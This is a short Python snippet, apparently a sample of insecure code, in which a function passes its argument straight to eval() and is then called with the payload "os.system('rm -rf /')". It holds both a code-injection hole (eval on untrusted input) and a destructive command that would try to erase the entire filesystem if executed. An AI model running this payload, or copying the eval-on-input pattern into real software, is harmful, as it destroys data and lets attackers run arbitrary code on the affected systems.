import os

def run_command(user_input):
    command = "ls -l"
    eval(user_input)

run_command("os.system('rm -rf /')")
